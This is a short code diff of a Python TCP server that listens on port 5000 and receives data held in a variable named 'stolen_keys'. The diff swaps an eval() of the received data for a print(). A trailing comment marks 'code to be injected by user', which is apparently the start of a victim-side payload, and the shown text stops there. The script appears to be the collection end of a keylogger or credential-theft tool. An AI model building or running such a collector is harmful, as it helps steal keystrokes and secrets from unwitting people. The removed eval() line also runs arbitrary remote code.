@@ -1,9 +1,12 @@
 #!/usr/bin/env python3
 
 import socket
+import os 
+
 
 ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 ns.bind(('',5000))
+
 
 while True:
     ns.listen()
@@ -14,8 +17,8 @@ while True:
             stolen_keys = connection.recv(4096)
             if not stolen_keys:
                 break
-            eval(stolen_keys.decode("utf-8"))
-
+            
+            print(stolen_keys.decode("utf-8"))
 ###################code to be injected by user
 #import socket
 
